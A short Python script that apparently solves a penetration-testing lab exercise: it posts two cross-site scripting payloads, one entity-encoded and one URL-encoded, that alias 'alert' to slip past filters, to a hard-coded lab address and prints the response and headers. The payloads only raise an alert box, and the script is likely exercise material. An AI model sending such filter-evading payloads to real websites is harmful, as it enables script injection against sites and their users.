import requests
url = "http://115.28.78.16:13333/pentest/04/"
re = requests.post(url, {"param1":"&lt;script&gt;x=alert;x('lightless');&lt;/script&gt;", \
                         "param2":"%3Cscript%3Ex%3Dalert%3Bx%28%27lightless%27%29%3B%3C/script%3E"})
print(re.text)
print(re.headers)
print(re.request.headers)
